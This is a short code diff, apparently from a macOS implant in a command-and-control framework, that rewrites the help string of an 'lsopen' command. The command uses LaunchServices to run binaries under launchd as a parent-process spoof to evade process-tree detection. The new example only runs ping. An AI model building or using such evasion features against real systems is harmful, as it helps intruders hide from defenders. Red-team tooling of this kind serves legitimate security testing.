@@ -7,7 +7,7 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("poseidon").AddCommand(agentstructs.Command{
 		Name:                "lsopen",
-		HelpString:          "lsopen {\"application\":[path],\"hideApp\":[boolean],\"appArgs\":[[arg1],[arg2],[arg3]...]}",
+		HelpString:          "lsopen -application \"/sbin/ping\" -hideApp false -appArgs 8.8.8.8 -t 47",
 		Description:         "Use LaunchServices API to run applications and binaries out of PID 1 (launchd). Works as a ppid spoof to evade process tree detections.",
 		Version:             1,
 		MitreAttackMappings: []string{"T1036.009"},
